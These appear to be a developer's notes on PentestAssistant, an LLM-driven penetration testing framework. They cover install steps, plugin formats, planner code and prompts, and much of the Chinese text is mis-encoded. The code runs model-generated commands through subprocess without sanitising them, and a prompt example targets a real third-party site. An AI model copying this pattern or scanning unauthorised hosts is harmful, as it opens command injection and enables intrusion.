<!--
 * @Author: coffeecat
 * @Date: 2025-03-04 16:53:48
 * @LastEditors: Do not edit
 * @LastEditTime: 2025-03-07 16:44:59
-->
# PentestAssistant
PentestAssistant åŸºäºŽ Web æ¸—é€æ£€æµ‹å·¥å…·ï¼Œæž„å»ºå¸¸ç”¨å‡½æ•°è°ƒç”¨ API çŸ¥è¯†åº“ï¼Œ
é€šè¿‡å¤šä»£ç†çš„æ–¹å¼å®žçŽ°æ¸—é€ä»»åŠ¡å»ºç«‹å’Œç»´æŠ¤ï¼Œ
åŸºäºŽ RAG æŠ€æœ¯å®žçŽ°æ¸—é€æ£€æµ‹ä»»åŠ¡çš„æ‰§è¡Œï¼Œä»¥æ­¤å®Œæˆæ¸—é€æ£€æµ‹çš„è‡ªåŠ¨åŒ–è¿‡ç¨‹ã€‚
> ä»€ä¹ˆæ„æ€ï¼Ÿï¼Ÿï¼Ÿ

![alt text](assets/pentestAssistant/image-1.png)

æ”¯æŒä¸¤ç§æ¸—é€æ£€æµ‹ä½¿ç”¨æ–¹å¼ï¼š
å•ä¸€å·¥å…·è°ƒç”¨ï¼šæŒ‡å®šæ¸—é€æ£€æµ‹å·¥å…·ï¼Œç”¨æˆ·ç»™å®šè‡ªç„¶è¯­è¨€æè¿°ä»»åŠ¡ï¼Œç³»ç»Ÿæ ¹æ®è¯·æ±‚è‡ªåŠ¨å®Œæˆå·¥å…·è°ƒç”¨å’Œæ‰§è¡Œ
å¤šå·¥å…·è”åˆè°ƒç”¨ï¼šé€‰æ‹©å¤šæ¬¾æ¸—é€æ£€æµ‹å·¥å…·ï¼Œç”¨æˆ·ç»™å®šè‡ªç„¶è¯­è¨€æè¿°ä»»åŠ¡ï¼Œç³»ç»Ÿè‡ªåŠ¨é€‰æ‹©å·¥å…·ï¼Œæ‰§è¡Œå‡½æ•°ï¼Œå®žçŽ°éœ€æ±‚



## çŽ¯å¢ƒæ­å»ºä¸Žå¯åŠ¨

```bash
#åˆ›å»ºå®¹å™¨
sudo docker run -it --name penassit  -v ./xsc_workspace:
/workspace -p 8888:8888 pytorch/pytorch /bin/bash


apt upgrade
git clone https://github.com/HUSTInfSecLabs/PentestAssistant.git

# è¯·æ³¨æ„pythonç‰ˆæœ¬ 3.10æ¯”è¾ƒå¥½
# python --version
# Python 3.10.13

pip install -r requirements.txt 

#----------------------------------------------
# å®‰è£…æ’ä»¶å’Œæ‰€éœ€è¦çš„ä¾èµ–åŒ…
pip3 install --upgrade setuptools
# CMSeek
git clone https://github.com/Tuhinshubhra/CMSeeK
pip install -r ./CMSeek/requirements.txt
mv ./CMSeeK/* ./plugin/CMSeek/
# Dirsearch
 git clone --branch v0.4.3 https://github.com/maurosoria/dirsearch.git
 pip install -r ./dirsearch/requirements.txt
 mv ./dirsearch/* ./plugin/Dirsearch/
# # Tplmap
#  git clone https://github.com/epinna/tplmap.git
#  pip install -r ./tplmap/requirements.txt --use-deprecated=legacy-resolver
#  mv ./tplmap/* ./plugin/Tplmap/Tplmap/
# XSStrike
 git clone https://github.com/s0md3v/XSStrike.git
 pip install -r ./XSStrike/requirements.txt
 mv ./XSStrike/* ./plugin/XSStrike/

```

```python
reranker_path = ./bge-reranker-large
[LLM]
llm_service = DeepSeek
llm_call_type = api

[LLM.DeepSeek]
model_name = DeepSeek-R1-Distill-Llama-70B
api_key = token123456
base_url = http://127.0.0.1:8888/v1
```

In this project, we use a reranker model to sort all api list to help LLM reduct the selection range, so we should download this reranker model: bge-reranker-large and modify the configuration.

```bash
curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh 
apt-get install git-lfs
git lfs install
GIT_LFS_SKIP_SMUDGE=1 git clone https://huggingface.co/BAAI/bge-reranker-large

cd bge-reranker-large

# æŸ¥çœ‹ LFS æ–‡ä»¶æŒ‡é’ˆï¼ˆæœªä¸‹è½½æ—¶æ˜¾ç¤ºæŒ‡é’ˆå“ˆå¸Œï¼‰
git lfs ls-files

git lfs pull #å…¨éƒ¨æ–‡ä»¶
cd ..

```

Moreover, we need to install the following penetration testing tools for PenetestAssistant to call: Nmap, Sqlmap, **Tqlmap**, **Xsstrike**,  Dnsenum, Hydra, and **Dirsearch**. 

For Xsstrike, Tplmap, Dirsearch, and CMSeek, we have included them in our source code, so we do not need to install them again.




```bash
#å®‰è£…sudo
# find /etc/sudoers.d
# ä¸Šè¿°å‘½ä»¤è¿”å›ž No such file or directoryï¼Œå°±è¯´æ˜Žä½ çš„ç³»ç»Ÿæ²¡æœ‰å®‰è£…sudo
apt-get install sudo
sudo apt update

#å®‰è£…nmap
sudo apt install nmap
# sqlmap
sudo apt install sqlmap
sudo apt upgrade sqlmap
# dnsenum
sudo apt install dnsenum
#hydra
sudo apt install hydra

#éªŒè¯
nmap --version 
sqlmap --version
hydra --version
dnsenum.pl --help

# Nmap version 7.80 ( https://nmap.org )
# 1.6.4#stable
# Hydra v9.2 (c) 2021

```


```bash
pip install --force-reinstall -v â€œopenai==1.55.3â€
```



```python
#å¯åŠ¨
python app.py
```

æˆåŠŸå¯åŠ¨å¦‚ä¸‹:
![alt text](assets/pentestAssistant/image.png)

### conquer
æœ€å¼€å§‹å› ä¸ºå¡çš„åŽŸå› ï¼Œä½¿ç”¨çš„1.5Bçš„æ¨¡åž‹ï¼Œç»“æžœæ¨¡åž‹ç†è§£èƒ½åŠ›å¤ªå·®äº†ï¼Œ
åˆå‘çŽ°rerank-modelä»…ä»…å ç”¨400MBå·¦å³çš„æ˜¾å­˜ï¼Œ
æ‰€ä»¥å†æ¬¡å¯åŠ¨70Bçš„dsï¼Œç„¶åŽè®¾ç½®æ˜¾å­˜åˆ©ç”¨çŽ‡ä¸º0.9ï¼ˆç”±æ­¤éœ€è¦çš„å¹³è¡¡æ“ä½œæ˜¯é™åˆ¶model-seq-lenå‚æ•°ï¼‰ï¼Œ
ç„¶åŽæœ‰äº†è¾ƒå¥½ç»“æžœï¼š
![alt text](assets/pentestAssistant/image-2.png)


## ä»£ç ç†Ÿæ‚‰
### plugin

åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹æ˜¯å„ä¸ªå·¥å…·çš„ä½¿ç”¨æ–¹æ³•
![alt text](assets/pentestAssistant/image-3.png)
ä»¥nmapä¸ºä¾‹å­ï¼Œ
![alt text](assets/pentestAssistant/image-4.png)
```json
{"name": "default_scan", "description": "Perform a default port scan on a certain IP or URL to detect the services enabled by the target", "args": [{"name": "target", "description": "Target ip or hostname"}], "exec_str": "nmap -sV -sC '{{target}}'"}
```
å¯è§ï¼Œè¿™æ˜¯nmapçš„æ“ä½œcmdå‘½ä»¤æŒ‡å—

ç„¶åŽåœ¨plugin.pyæ–‡ä»¶ä¸­å¯¹æ’ä»¶è°ƒç”¨è¿›è¡Œäº†å°è£…ã€‚
```python
# plugin/plugin.py

#å¯¹ä¸€æ¡å‘½ä»¤çš„
#çš„å‚æ•°çš„åç§°å’ŒåŠŸèƒ½æè¿°çš„å°è£…
class Parameter:
    name: str
    description: str

    def __init__(self, data: dict) -> None:
        self.name = data["name"]
        self.description = data["description"]

#å¯¹ä¸€æ¡å‘½ä»¤çš„å°è£…
#åŒ…æ‹¬ è¯¥å‘½ä»¤åç§°ã€å‘½ä»¤åŠŸèƒ½æè¿°ã€å‚æ•°åˆ—è¡¨ã€æ‰§è¡Œè¡¨è¾¾å¼
class Function:
    name: str
    description: str
    parameters: List[Parameter]
    exec_str: str

    def __init__(self, data: dict) -> None:
        self.name = data["name"]
        self.description = data["description"]
        self.exec_str = data["exec_str"]
        self.parameters = []
        for arg in data["args"]:
            self.parameters.append(Parameter(arg))
#å¯¹ä¸€ç»„å‘½ä»¤çš„å°è£…
class Skill:
    functions: List[Function]

    def __init__(self, data: List[str]) -> None:
        self.functions = []
        for item in data:
            item = json.loads(item)
            self.functions.append(Function(item))

    def get_function(self, name: str) -> Function:
        for function in self.functions:
            if function.name == name:
                return function

        return None


# æ¯”å¦‚è¯´å¯¹ä¸Šè¿°ä¾‹å­ä¸­ nmapçš„jsonlæ–‡ä»¶çš„å°è£…
class Plugin:

    def __init__(self) -> None:
        self.plugin_dir = os.path.dirname(__file__)
        # /PentestAssistant/plugin

    def read_skill(self, skill_name: str) -> Skill:
        skill_file_path = os.path.join(self.plugin_dir, skill_name ,f"{skill_name}.jsonl")
        # å³ä¸Šè¿°ä¾‹å­ä¸­çš„ nmapçš„jsonlæ–‡ä»¶

        if not os.path.exists(skill_file_path):
            return []

        with open(skill_file_path, "r") as fp:
            lines = fp.readlines()

        return Skill(lines)

```


### model
è¿™é‡Œæ²¡ä»€ä¹ˆå¯è¯´çš„
å°±æ˜¯é¦–å…ˆå®žçŽ°ä¸€ä¸ªæŠ½è±¡åŸºç±»ChatModelï¼Œ

```python
from abc import ABC, abstractmethod


class ChatModel(ABC):

    def __init__(self) -> None:
        super().__init__()

    @abstractmethod
    def chat(self, prompt: str = None) -> str:
        pass

```
ç„¶åŽä¹‹åŽæ‰€æœ‰çš„modelé€šè¿‡ç»§æ‰¿è¯¥ç±»ï¼Œå®žçŽ°chatæ–¹æ³•ç”¨äºŽäº¤äº’ï¼Œ  
å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œéƒ½ç”¨çš„openaiçš„åº“å®žçŽ°ï¼Œè€Œä¸”é€šè¿‡é…ç½®æ–‡ä»¶ç¡®å®šè¯»å–é‚£ä¸ªapi   
å¦‚ä¸‹é¢çš„deepseek
```python
from model.base import ChatModel
from config import config_manager

from openai import OpenAI


class GPTChatModel(ChatModel):

    def __init__(self):
        super().__init__()
        api_key = config_manager.config["LLM.GPT"]["api_key"]
        base_url = config_manager.config["LLM.GPT"]["base_url"]
        self.model_name = config_manager.config["LLM.GPT"]["model_name"]
        self.client = OpenAI(api_key=api_key, base_url=base_url)

    # åŸºæœ¬çš„æ¨¡åž‹å¯¹è¯
    def chat(self, prompt: str = None) -> str:
        completion = self.client.chat.completions.create(
            model=self.model_name,
            messages=[{
                'role': 'system',
                'content': 'You are a helpful assistant.'
            }, {
                'role': 'user',
                'content': prompt,
            }],
        )
        return completion.choices[0].message.content

```

> è¿™é‡ŒqwenåŠ äº†ä¸€ä¸ªfunction callingï¼Œè€Œå…¶ä»–çš„å¦‚deepseekå¹¶æœªå®žçŽ°
``` python
"""
toolçš„æ ¼å¼
ä»¥nmapå·¥å…·ä¸ºä¾‹å­
skill_nameå³å·¥å…·åç§°nmapï¼Œfunctionå³nmapçš„ä¸€æ¡å‘½ä»¤ï¼Œargsæ˜¯è¯¥å‘½ä»¤ç›¸å…³å‚æ•°
tool = {
            "type": "function",
            "function": {
                "name": self.skill_name + "." + function.name,
                "description": function.description,
                "parameters": {
                    "type": "object",
                    "properties": {
                        arg.name: {
                            "type": "string",
                            "description": arg.description
                        }
                        for arg in function.parameters
                    }
                },
                "required": []
            }
        }
"""
# æ¨¡åž‹è°ƒç”¨å·¥å…·ï¼ï¼ï¼
# æ¨¡åž‹æ ¹æ®å¯è°ƒç”¨å·¥å…·å‘½ä»¤ é€‰æ‹©æœ€åˆé€‚çš„å‘½ä»¤åŠå…·ä½“å‚æ•°
def function_call(self, prompt: str = None, tools: Optional[List[Dict]] = None) -> str:
        completion = self.client.chat.completions.create(
            model=self.model_name,
            messages=[{
                'role': 'system',
                'content': 'You are a helpful assistant.'
            }, {
                'role': 'user',
                'content': prompt,
            }],
            tools=tools,
        )
        return completion.model_dump()['choices'][0]['message']['tool_calls'][0]['function']
"""
è¿”å›žç¤ºä¾‹ï¼š
{
    "name": "nmap.scan_network",
    "arguments": "{\"target\": \"192.168.1.0/24\"}"
}
ç„¶åŽåŽç»­ä¾›shellè§£æžæ‰§è¡Œå³å¯
"""
```

> å¥½åƒæ²¡ä»€ä¹ˆä¸åŒï¼Œå°è¯•ç›´æŽ¥åœ¨åŸºç±»ä¸­æ·»åŠ è¯¥å·¥å…·è°ƒç”¨æ–¹æ³•

### planner
é¦–å…ˆæ˜¯ä¸¤ä¸ªæŠ½è±¡åŸºç±»
```python
# å¯¹æ‰§è¡Œè®¡åˆ’çš„å°è£…
# åŒ…æ‹¬prompt,goal, ç”Ÿæˆçš„è®¡åˆ’
class Plan:
    """A simple plan object for the Semantic Kernel"""

    def __init__(self, prompt: str, goal: str, generated_plan: Union[dict, str]):
        self.prompt = prompt
        self.goal = goal
        self.generated_plan = generated_plan

    def __str__(self):
        return f"Prompt: {self.prompt}\nGoal: {self.goal}\nPlan: {self.generated_plan}"

    def __repr__(self):
        return str(self)

# è®¡åˆ’å…·ä½“æ‰§è¡Œå™¨ --> å°†è‡ªç„¶è¯­è¨€planç¿»è¯‘æˆå…·ä½“å‘½ä»¤planå¹¶æ‰§è¡Œ
# å…·ä½“åšæ³•æ˜¯ä»Ž ä¸Šè¿°æ’ä»¶å‘½ä»¤æ•°æ®é›†ä¸­ æ£€ç´¢æœ€ç›¸å…³cmdå‘½ä»¤,æž„é€ å…·ä½“æ‰§è¡Œå‘½ä»¤çš„è®¡åˆ’ï¼Œ å¹¶é€šè¿‡subprocessè¿›è¡Œcmdçš„æ‰§è¡Œ
class Planner(ABC):
    """A planner aim to retrieve similar api from specific database according to user query"""

    def __init__(self, chat_model: ChatModel, skill_name: str = None, reranker: Retrieval = None) -> None:
        self.skill_name = skill_name
        self.chat_model = chat_model
        self.reranker = reranker

    @abstractmethod
    def create_plan(self, goal: str) -> Optional[Plan]:
        pass

    @abstractmethod
    def execute_plan(self, plan: Plan) -> str:
        pass
```

è¿˜æ˜¯æ¯”å¦‚nmap_plammer
```python
class NmapPlanner(Planner):
    """A planner for nmap tool api retrieval"""

    def __init__(self, chat_model, skill_name=None, reranker=None):
        super().__init__(chat_model, skill_name, reranker)
        self.skill = plugin.read_skill(self.skill_name)


    # æ ¹æ®å·¥å…·å‘½ä»¤çš„åŠŸèƒ½æè¿°  ä¸Ž ç›®æ ‡goal åšç›¸ä¼¼åº¦åŒ¹é…ï¼Œ èŽ·å–topkçš„å·¥å…·å‘½ä»¤ï¼Œ
    # è¿™é‡Œæ˜¯ragå¢žå¼ºçš„ï¼Œllmå°†åŸºäºŽtopkå‘½ä»¤è¿›ä¸€æ­¥é€‰æ‹©å‡ºæœ€åˆé€‚çš„å‘½ä»¤åŠå…¶å‚æ•°
    def _create_available_functions(self, goal: str) -> str:
        """
        generates a filtered list of callable tools (functions) based on their relevance to a given goal.
        """
        functions = self.skill.functions
        functions_description = []
        for function in functions:
            functions_description.append(function.description)

        # æ ¹æ®å·¥å…·å‘½ä»¤çš„åŠŸèƒ½æè¿°  ä¸Ž ç›®æ ‡goal åšç›¸ä¼¼åº¦åŒ¹é…ï¼Œ èŽ·å–topkçš„å·¥å…·å‘½ä»¤
        topk_descriptions = self.reranker.compute_topk(goal, functions_description, top_k=10)

        # Create the [AVAILABLE FUNCTIONS] section of the tools
        tools = []
        for function in functions:
            if function.description not in topk_descriptions:
                continue

            tool = {
                "type": "function",
                "function": {
                    "name": self.skill_name + "." + function.name,
                    "description": function.description,
                    "parameters": {
                        "type": "object",
                        "properties": {
                            arg.name: {
                                "type": "string",
                                "description": arg.description
                            }
                            for arg in function.parameters
                        }
                    },
                    "required": []
                }
            }
            tools.append(tool)

        logger.info(": available_functions - {tools}".format(tools=tools))
        return tools


    def create_plan(
        self,
        goal: str,
    ) -> Tuple[int, Plan]:
        """
        Creates a plan for the given goal based off the functions that
        are available in the plugins.
        """

        # Create the tools list for the planner with the given goal
        tools = self._create_available_functions(goal)

        # llmå°†åŸºäºŽtopkå‘½ä»¤è¿›ä¸€æ­¥é€‰æ‹©å‡ºæœ€åˆé€‚çš„å…·ä½“å‘½ä»¤åŠå…¶å‚æ•°
        generated_plan = self.chat_model.function_call(goal, tools)
        logger.info(f"generated_plan - {generated_plan}")

        return 0, Plan(prompt=goal, goal=goal, generated_plan=generated_plan)

    # subprocesså­è¿›ç¨‹
    # è°ƒç”¨å…·ä½“nmapå‘½ä»¤å¹¶èŽ·å–ç»“æžœ
    def _exec_nmap(self, cmd: str) -> str:
        process = subprocess.run(cmd.split(), capture_output=True)

        if process.returncode != 0:
            logger.warn(f": nmap call error - {repr(cmd)} - {repr(process.stderr.decode())}")

        return process.stdout.decode("utf-8", "ignore")

    # llmç”Ÿæˆçš„å…·ä½“å‘½ä»¤plançš„æ‰§è¡Œ
    # è°ƒç”¨ä¸Šé¢å‡½æ•°æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›žç»“æžœ
    def execute_plan(self, plan: Plan) -> str:
        """
        Given a plan, execute each of the functions within the plan
        from start to finish and output the result.
        """
        logger.info(": Nmap Planner Plan -: {plan}".format(plan=repr(plan.generated_plan)))
        generated_plan_json = plan.generated_plan

        #è¿™é‡Œå°±æ˜¯llmç”Ÿæˆçš„jsonè§£æž
        # get function from generated_plan_json
        _, function_name = generated_plan_json["name"].split(".")
        function = self.skill.get_function(function_name)

        # parse params from generated_plan_json and exec function
        exec_str = function.exec_str
        if isinstance(generated_plan_json["arguments"], str):
            generated_plan_json["arguments"] = json.loads(generated_plan_json["arguments"])

        for arg_name, arg_value in generated_plan_json["arguments"].items():
            exec_str = exec_str.replace(f"{{{{{str(arg_name)}}}}}", str(arg_value))

        result = self._exec_nmap(exec_str)

        return result

```
>
>ToolsPlannerç±»ä¸Žä¸Šè¿°ç±»å·®ä¸å¤šï¼Œ
>NmapPlannerç†è®ºæ¥è®²åº”è¯¥æ˜¯ é€šç”¨çš„ ã€‚ã€‚ã€‚

æ­¤å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªç±»ShortenSuggestion å’Œ CapChecker
```python
class CapChecker(Planner):

    def __init__(self, chat_model, skill_name=None, reranker=None):
        super().__init__(chat_model, skill_name, reranker)

    def create_plan(self, goal: str) -> Tuple[int, Plan]:
        logger.info(f": CapChecker input- {repr(goal)}")

        # Create the context for the planner
        prompt = PROMPT.format(input=goal)
        response = self.chat_model.chat(prompt)

        return 0, Plan(prompt=PROMPT, goal=goal, generated_plan=response)

    def execute_plan(self, plan: Plan) -> str:
        return int(plan.generated_plan)


class ShortenSuggestion(Planner):

    def __init__(self, chat_model, skill_name=None, reranker=None):
        super().__init__(chat_model, skill_name, reranker)

    def create_plan(self, goal: str) -> Plan | None:
        logger.info(f": Capability check query input - {repr(goal)}")

        # Create the context for the planner
        prompt = PROMPT.format(input=goal)
        response = self.chat_model.chat(prompt)

        return Plan(prompt=PROMPT, goal=goal, generated_plan=response)

    def execute_plan(self, plan: Plan) -> str:
        return plan.generated_plan

```

ä¸¤ä¸ªç±»çš„ä¸»è¦å·®åˆ«åº”è¯¥åœ¨äºŽpromptï¼Œä¸»è¦å‡½æ•°éƒ½æ˜¯create_plan
å¯¹äºŽCapCheckerçš„promptå¦‚ä¸‹ï¼š
```python
"""
#è¿™é‡Œæ˜¯ä¸­æ–‡ç¿»è¯‘ï¼Œæ¯”è¾ƒæ–¹ä¾¿
-----------------------------------
ä½ æ˜¯ä¸€ä¸ªç²¾é€šWebæ¸—é€æµ‹è¯•çŸ¥è¯†çš„è§„åˆ’æœºå™¨äººã€‚
ä½ çš„ä»»åŠ¡æ˜¯æ ¹æ®ä½ å¯¹æ¸—é€æµ‹è¯•ç›®æ ‡çš„ç†è§£ï¼Œåˆ¤æ–­ç”¨æˆ·çš„[ç›®æ ‡]æ˜¯å¦éœ€è¦ä½¿ç”¨NMAPå·¥å…·ã€CMSeekå·¥å…·ã€Dirsearchå·¥å…·ã€Hydraå·¥å…·ã€Sqlmapå·¥å…·ã€Tplmapå·¥å…·ã€XSStrikeå·¥å…·ï¼Œè¿˜æ˜¯ä»…ä»…éœ€è¦åˆ†æžæ€»ç»“ã€‚

- å¦‚æžœä»¥ä¸Šå·¥å…·éƒ½ä¸éœ€è¦ï¼Œåˆ™è¾“å‡ºâ€œ0â€ã€‚
- å¦‚æžœéœ€è¦NMAPå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ1â€ã€‚
- å¦‚æžœéœ€è¦CMSeekå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ2â€ã€‚
- å¦‚æžœéœ€è¦Dirsearchå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ3â€ã€‚
- å¦‚æžœéœ€è¦Hydraå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ4â€ã€‚
- å¦‚æžœéœ€è¦Sqlmapå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ5â€ã€‚
- å¦‚æžœéœ€è¦Tplmapå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ6â€ã€‚
- å¦‚æžœéœ€è¦XSStrikeå·¥å…·ï¼Œåˆ™è¾“å‡ºâ€œ7â€ã€‚
------------------------------------
"""
"""
You are a planning robot proficient in Web penetration testing knowledge.  
Your task is to determine, based on your understanding of penetration testing objectives, whether the user's [objective] requires the use of the NMAP tool, CMSeek tool, Dirsearch tool, Hydra tool, Sqlmap tool, Tplmap tool, XSStrike tool, or just analysis and summary.  

- If none of the above tools are required, output "0".  
- If the NMAP tool is required, output "1".  
- If the CMSeek tool is required, output "2".  
- If the Dirsearch tool is required, output "3".  
- If the Hydra tool is required, output "4".  
- If the Sqlmap tool is required, output "5".  
- If the Tplmap tool is required, output "6".  
- If the XSStrike tool is required, output "7".  

Do not output anything other than "0", "1", "2", "3", "4", "5", "6", "7". Stop output immediately after completing the task.  

Below are two examples:  

[Objective]  
Help me scan the ports of www.baidu.com and check for SQL vulnerabilities.  
[Output]  
5  

[Objective]  
Can you check if there are XSS vulnerabilities in the web service at 172.20.0.59:11453?  
[Output]  
7  

End of examples. Real application begins below:  

[Objective]  
{input}  
[Output]  
"""
```
ç®€å•æ¥è¯´ï¼Œ**å¯¹äºŽç›®æ ‡goalï¼Œé¦–å…ˆè®©llmåˆ¤æ–­ä¸‹æ˜¯å¦éœ€è¦ä½¿ç”¨è¿™äº›å·¥å…·,è¿™å°±æ˜¯CapCheckerçš„ä¸»è¦åŠŸèƒ½**
è‡³äºŽShortenSuggestionçš„promptå¦‚ä¸‹ï¼š
```python
"""
ä½ æ˜¯ä¸€ä¸ªå¥å­åŽ‹ç¼©æœºå™¨äººï¼Œæ“…é•¿å°†é•¿å»ºè®®ç¼©çŸ­ä¸ºç®€æ´çš„å»ºè®®ï¼ŒåŒæ—¶ä¿ç•™åŽŸæ„ã€‚è¦ç¼©çŸ­çš„å»ºè®®ä½äºŽâ€œ[Advice]â€éƒ¨åˆ†ä¸‹ã€‚è¯·åœ¨â€œ[Result]â€éƒ¨åˆ†ä¸‹è¾“å‡ºåŽ‹ç¼©ç»“æžœã€‚

ä»¥ä¸‹æ˜¯ç¤ºä¾‹ï¼š

[Advice]
å‡è®¾æ‰€æœ‰è¾“å…¥éƒ½æ˜¯æ¶æ„çš„ã€‚ä½¿ç”¨â€œæŽ¥å—å·²çŸ¥è‰¯å¥½â€çš„è¾“å…¥éªŒè¯ç­–ç•¥ï¼Œè¯¥ç­–ç•¥é‡‡ç”¨ä¸¥æ ¼å®šä¹‰çš„å¯æŽ¥å—è¾“å…¥åˆ—è¡¨ã€‚æ‹’ç»ä»»ä½•ä¸ä¸¥æ ¼ç¬¦åˆè§„èŒƒçš„è¾“å…¥æˆ–å°†å…¶è½¬æ¢ä¸ºåˆè§„å½¢å¼ã€‚æ‰§è¡Œè¾“å…¥éªŒè¯æ—¶ï¼Œè¯·è€ƒè™‘æ‰€æœ‰å¯èƒ½ç›¸å…³çš„å±žæ€§ï¼ŒåŒ…æ‹¬é•¿åº¦ã€è¾“å…¥ç±»åž‹ã€å¯æŽ¥å—å€¼çš„å…¨éƒ¨èŒƒå›´ã€ç¼ºå¤±æˆ–é¢å¤–è¾“å…¥ã€è¯­æ³•ã€ç›¸å…³å­—æ®µä¹‹é—´çš„ä¸€è‡´æ€§ä»¥åŠå¯¹ä¸šåŠ¡è§„åˆ™çš„éµå®ˆæƒ…å†µã€‚ä¾‹å¦‚ï¼Œä½œä¸ºä¸šåŠ¡è§„åˆ™ï¼Œâ€œboatâ€åœ¨è¯­æ³•ä¸Šæ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒåªåŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ã€‚ä½†æ˜¯ï¼Œå¦‚æžœè¾“å…¥é¢„è®¡åªåŒ…å«â€œçº¢è‰²â€æˆ–â€œè“è‰²â€ç­‰é¢œè‰²ï¼Œåˆ™æ— æ•ˆã€‚
ä¸è¦ä»…ä»…ä¾èµ–äºŽè¯†åˆ«æ¶æ„æˆ–æ ¼å¼é”™è¯¯çš„è¾“å…¥ã€‚è¿™ç§æ–¹æ³•å¾ˆå¯èƒ½ä¼šæ¼æŽ‰è‡³å°‘ä¸€ä¸ªä¸éœ€è¦çš„è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯å¦‚æžœä»£ç çŽ¯å¢ƒå‘ç”Ÿå˜åŒ–ï¼Œä»Žè€Œä¸ºæ”»å‡»è€…ç»•è¿‡é¢„æœŸçš„éªŒè¯ç•™ä¸‹äº†ç©ºé—´ã€‚ä½†æ˜¯ï¼Œæ‹’ç»åˆ—è¡¨å¯ä»¥å¸®åŠ©æ£€æµ‹æ½œåœ¨æ”»å‡»æˆ–è¯†åˆ«æ ¼å¼é”™è¯¯çš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥åº”è¯¥è¢«ç›´æŽ¥æ‹’ç»ã€‚
æž„é€  SQL æŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œä½¿ç”¨ä¸¥æ ¼çš„å…è®¸åˆ—è¡¨æ ¹æ®è¯·æ±‚ä¸­å‚æ•°çš„é¢„æœŸå€¼æ¥é™åˆ¶å­—ç¬¦é›†ã€‚è¿™é—´æŽ¥å‡å°‘äº†æ”»å‡»é¢ï¼Œä½†è¿™ç§æŠ€æœ¯ä¸å¦‚æ­£ç¡®çš„è¾“å‡ºç¼–ç å’Œè½¬ä¹‰é‚£ä¹ˆé‡è¦ã€‚
æ­£ç¡®çš„è¾“å‡ºç¼–ç ã€è½¬ä¹‰å’Œå¼•å·æ˜¯é˜²æ­¢ SQL æ³¨å…¥çš„æœ€æœ‰æ•ˆè§£å†³æ–¹æ¡ˆï¼Œå³ä½¿è¾“å…¥éªŒè¯å¯ä»¥æä¾›ä¸€äº›çºµæ·±é˜²å¾¡ã€‚è¿™æ˜¯å› ä¸ºå®ƒæœ‰æ•ˆåœ°é™åˆ¶äº†å¯èƒ½å‡ºçŽ°åœ¨è¾“å‡ºä¸­çš„å†…å®¹ã€‚è¾“å…¥éªŒè¯å¹¶ä¸æ€»èƒ½é˜²æ­¢ SQL æ³¨å…¥ï¼Œç‰¹åˆ«æ˜¯å¦‚æžœæ”¯æŒå¯èƒ½åŒ…å«ä»»æ„å­—ç¬¦çš„è‡ªç”±æ–‡æœ¬å­—æ®µã€‚ä¾‹å¦‚ï¼Œåç§°â€œO'Reillyâ€å¯èƒ½ä¼šé€šè¿‡éªŒè¯ï¼Œå› ä¸ºå®ƒæ˜¯è‹±è¯­ä¸­çš„å¸¸è§å§“æ°ã€‚ä½†æ˜¯ï¼Œå®ƒä¸èƒ½ç›´æŽ¥æ’å…¥æ•°æ®åº“ï¼Œå› ä¸ºå®ƒåŒ…å«æ’‡å·â€œ'â€ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œè½¬ä¹‰æˆ–ä»¥å…¶ä»–æ–¹å¼å¤„ç†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆ é™¤æ’‡å·å¯èƒ½ä¼šé™ä½Ž SQL æ³¨å…¥çš„é£Žé™©ï¼Œä½†å¯èƒ½ä¼šå› è®°å½•é”™è¯¯çš„åç§°è€Œå¯¼è‡´ä¸æ­£ç¡®çš„è¡Œä¸ºã€‚
åœ¨å¯è¡Œçš„æƒ…å†µä¸‹ï¼Œæœ€å®‰å…¨çš„æ–¹æ³•å¯èƒ½æ˜¯å®Œå…¨ç¦æ­¢ä½¿ç”¨å…ƒå­—ç¬¦ï¼Œè€Œä¸æ˜¯å¯¹å…¶è¿›è¡Œè½¬ä¹‰ã€‚è¿™æä¾›äº†ä¸€å®šç¨‹åº¦çš„çºµæ·±é˜²å¾¡ã€‚å°†æ•°æ®è¾“å…¥æ•°æ®åº“åŽï¼ŒåŽç»­å¤„ç†æ­¥éª¤å¯èƒ½ä¼šåœ¨ä½¿ç”¨å‰å¿½ç•¥è½¬ä¹‰ï¼Œå¹¶ä¸”æ‚¨å¯èƒ½æ— æ³•æŽ§åˆ¶è¿™äº›è¿‡ç¨‹ã€‚

[ç»“æžœ]
è¾“å…¥éªŒè¯ç­–ç•¥ï¼šä½¿ç”¨â€œæŽ¥å—å·²çŸ¥è‰¯å¥½â€ç­–ç•¥æ‹’ç»æˆ–è½¬æ¢ä¸åˆè§„çš„è¾“å…¥ï¼ŒåŒæ—¶è€ƒè™‘é•¿åº¦ã€ç±»åž‹ã€èŒƒå›´ã€è¯­æ³•ã€ä¸€è‡´æ€§å’Œä¸šåŠ¡è§„åˆ™ã€‚
é¿å…ä»…ä¾èµ–æ£€æµ‹ï¼šä¸è¦ä»…ä¾èµ–æ£€æµ‹æ¶æ„æˆ–æ ¼å¼é”™è¯¯çš„è¾“å…¥ï¼›ä½¿ç”¨å…è®¸å’Œæ‹’ç»åˆ—è¡¨å¢žå¼ºå®‰å…¨æ€§ã€‚
